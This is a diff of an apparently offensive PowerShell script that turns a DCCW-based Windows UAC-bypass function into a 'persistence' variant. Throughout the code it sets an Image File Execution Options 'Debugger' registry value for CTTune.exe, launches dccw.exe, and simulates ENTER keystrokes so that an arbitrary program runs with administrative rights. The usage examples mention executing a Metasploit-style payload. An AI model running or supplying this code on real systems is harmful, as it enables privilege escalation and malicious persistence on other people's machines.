@@ -10,24 +10,14 @@ A new registry key will be created at "HKLM\SOFTWARE\Microsoft\Windows NT\Curren
 .PARAMETER Program
 Specify the absolute or relative path for executable or application you wish to run with elevated permissions. Specifies a local script that this cmdlet runs with elevated permissions. The script must exist on the local  computer or in a directory that the local computer can access.
 
-.PARAMETER Seconds
-This parameter is used to define the number of seconds to wait for powershell to open. The default value is 3. If you set this value too high multiple PowerShell Windows will open.
-
-.PARAMETER EnterCount
-This parameter is used to define the number of times to hit the ENTER key after DCCW.exe pops up. The default value is 15.
-
 
 .EXAMPLE
-Invoke-DccwUACBypass -Program "cmd /c start powershell"
+Invoke-DccwPersistence -Program "cmd /c start powershell"
 # This example exploits the DCCW UAC bypass method to open PowerShell with administrative privileges
 
 .EXAMPLE
-Invoke-DccwUACBypass -Program "cmd /c start mfs.exe" 
+Invoke-DccwPersistence "cmd /c start mfs.exe" 
 # This example exploits the DCCW UAC bypass method to execute the payload msf.exe with administrative privileges
-
-.EXAMPLE
-Invoke-DccwUACBypass -Program "cmd /c start mfs.exe" -Seconds 3 -EnterCount 15
-# This example exploits the DCCW UAC bypass method to execute the payload msf.exe with administrative privileges, waiting 3 seconds for the msf.exe to execute
 
 
  .NOTES
@@ -57,7 +47,7 @@ None
 None
 
 #>
-Function Invoke-DccwUACBypass { 
+Function Invoke-DccwPersistence { 
     [CmdletBinding()]
     Param(
         [Parameter(
@@ -65,23 +55,18 @@ Function Invoke-DccwUACBypass {
             Mandatory=$False,
             ValueFromPipeLine=$False,
             HelpMessage='Enter an executable you wish to execute to gain privesc. Default value is cmd /c start powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoExit -NoProfile')]  # End Parameter
-        [String]$Program = "cmd /c start powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoExit -NoProfile",
-
-        [Parameter(
-            Position=1,
-            Mandatory=$False,
-            ValueFromPipeline=$False)]  # End Parameter
-        [Int32]$Seconds = 3,
-
-        [Parameter(
-            Position=2,
-            Mandatory=$False,
-            ValueFromPipeline=$False)]  # End Parameter
-        [Int32]$EnterCount = 15
+        [String]$Program = "cmd /c start powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoExit -NoProfile"
     )  # End param
 
 BEGIN 
 {
+
+    If (!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
+    {
+    
+        Throw "This is required to run as an adminstrator to establish persistence."
+    
+    }  # End if
 
     $RegValue = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CTTune.exe"  
     $Value = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -Property "ConsentPromptBehaviorAdmin"
@@ -121,7 +106,8 @@ PROCESS
     {
 
         New-Item -Path $RegValue -Force
-
+        New-ItemProperty -Path $RegValue -Name "Debugger" -Value $Program -Force
+        
     }  # End If
     Else
     {
@@ -129,9 +115,6 @@ PROCESS
         Write-Verbose "Registry Value $RegValue already exists"
 
     }  # End Else
-
-    New-ItemProperty -Path $RegValue -Name "Debugger" -Value $Program -Force
-
 
     Write-Verbose "Starting the DCCW process"
     Start-Process -FilePath "C:\Windows\SysWOW64\dccw.exe"
@@ -141,18 +124,10 @@ PROCESS
     ForEach ($WindowTitle in $WindowTitles)
     {
 
-        Switch ($WindowTitle)
-        {
-
-            'Display Color Calibration' { $Count = $EnterCount }
-            'ClearType Text Tuner' { $Count = 8 }
-
-        }  # End Switch
-
         $WindowHandle = Get-Process | Where-Object { $_.MainWindowTitle -Like "*$WindowTitle*" } | Select-Object -ExpandProperty MainWindowHandle
 
         [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
-        For ($i = 0; $i -lt $Count; $i++)
+        For ($i = 0; $i -lt 15; $i++)
         {
 
             [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
@@ -160,9 +135,9 @@ PROCESS
 
         }  # End For
 
-        Start-Sleep -Seconds $Seconds
-
     }  # End ForEach
+    
+    Start-Sleep -Seconds 1
 
 }  # End PROCESS
 END
@@ -175,22 +150,17 @@ END
         Remove-Item -Path $RegValue -Recurse -Force
 
     }  # End If
-
+    
     Write-Verbose "Closing the CTTune window"
-    If (Get-Process -Name cttune)
-    {
-
-        Stop-Process -Name cttune -Force
-
-    }  # End If
-    Else 
+    Do
     {
 
         Start-Sleep -Seconds 1
-        Stop-Process -Name cttune -Force
 
-    }  # End Else
+    } Until (Get-Process -Name cttune -ErrorAction SilentlyContinue)
+   
+    Stop-Process -Name cttune -Force
 
 }  # End END
 
-}  # End Function Invoke-DccwUACBypass
+}  # End Function Invoke-DccwPersistence
